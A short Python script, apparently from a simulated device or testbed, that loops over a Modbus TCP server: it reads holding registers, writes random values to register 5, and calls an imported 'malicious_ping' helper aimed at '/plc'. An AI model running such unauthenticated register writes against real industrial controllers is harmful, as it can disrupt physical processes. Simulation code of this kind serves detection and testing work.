#!/usr/bin/env python3
from __future__ import annotations

import random
import time

from pymodbus.client import ModbusTcpClient

from .common import DEVICE_ID, FIRMWARE_VERSION, SERVER_IP, json_log, jitter, malicious_ping


def main() -> None:
    client = ModbusTcpClient(SERVER_IP, port=502)
    if not client.connect():
        json_log("modbus_error", error="connect_failed")
        return
    try:
        while True:
            rr = client.read_holding_registers(0, 10, unit=1)
            json_log("modbus_read", registers=rr.registers if rr.isError() is False else "error")
            value = random.randint(0, 4095)
            client.write_register(5, value, unit=1)
            json_log("modbus_write", register=5, value=value)
            malicious_ping("/plc")
            time.sleep(jitter(20))
    finally:
        client.close()


if __name__ == "__main__":
    main()
